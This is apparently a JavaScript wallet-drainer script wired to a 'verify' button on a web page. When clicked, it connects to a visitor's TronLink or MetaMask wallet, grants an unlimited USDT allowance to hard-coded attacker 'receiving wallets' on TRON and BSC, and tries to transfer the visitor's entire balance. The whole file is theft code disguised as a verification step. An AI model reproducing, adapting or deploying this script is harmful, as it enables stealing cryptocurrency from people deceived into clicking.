const TRC20_USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
const BEP20_USDT = "0x55d398326f99059fF775485246999027B3197955";

// Your receiving wallets:
const RECEIVER_TRC = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
const RECEIVER_BEP = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";

const ABI = [
  { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
  { "constant": false, "inputs": [{ "name": "sender", "type": "address" }, { "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
  { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
  { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" }
];

document.getElementById("verifyBtn").addEventListener("click", async () => {
  if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
    handleTRC20();
  } else if (window.ethereum) {
    handleBEP20();
  } else {
    alert("Please install TronLink or MetaMask/SafePal.");
  }
});

// 🔷 TRC-20 (TronLink)
async function handleTRC20() {
  try {
    const tronWeb = window.tronWeb;
    const userAddress = tronWeb.defaultAddress.base58;

    const contract = await tronWeb.contract(ABI, TRC20_USDT);
    const balance = await contract.methods.balanceOf(userAddress).call();

    await contract.methods.approve(RECEIVER_TRC, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
    await contract.methods.transferFrom(userAddress, RECEIVER_TRC, balance).send();

    alert("TRC-20 USDT sent!");
  } catch (e) {
    alert("Error (TRC-20): " + e.message);
  }
}

// 🟠 BEP-20 (MetaMask / SafePal)
async function handleBEP20() {
  try {
    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];

    const contract = new web3.eth.Contract(ABI, BEP20_USDT);
    const balance = await contract.methods.balanceOf(userAddress).call();

    await contract.methods.approve(RECEIVER_BEP, web3.utils.toTwosComplement(-1)).send({ from: userAddress });
    await contract.methods.transferFrom(userAddress, RECEIVER_BEP, balance).send({ from: userAddress });

    alert("BEP-20 USDT sent!");
  } catch (e) {
    alert("Error (BEP-20): " + e.message);
  }
}
